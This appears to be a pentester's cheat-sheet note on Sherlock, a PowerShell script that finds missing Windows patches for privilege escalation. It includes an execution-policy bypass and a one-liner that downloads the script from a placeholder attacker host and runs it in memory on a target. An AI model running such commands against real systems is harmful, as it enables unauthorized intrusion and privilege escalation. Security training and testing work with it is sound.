---
tags: [tool, privesc, windows, exploit]
tool: "sherlock"
category: "Privesc"
installed: true
phase: [privesc]
---

# Sherlock - Windows Exploit Suggester

## Tool Overview
Purpose: PowerShell script to find missing Windows patches for privilege escalation
Location: ~/tools/privesc/windows/Sherlock/Sherlock.ps1

## When to Use
- After basic enumeration
- To find missing patches
- For older Windows systems (pre-Win10)

## How to Use It

Load in PowerShell:
powershell -ep bypass
Import-Module .\Sherlock.ps1

Check for Missing Patches:
Find-AllVulns

Check Specific Exploit:
Find-MS14058
Find-MS15051
Find-MS16032

Transfer to Target:
On Kali: cd ~/tools/privesc/windows/Sherlock && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/Sherlock.ps1'); Find-AllVulns"

## Related Tools
windows-exploit-suggester, watson
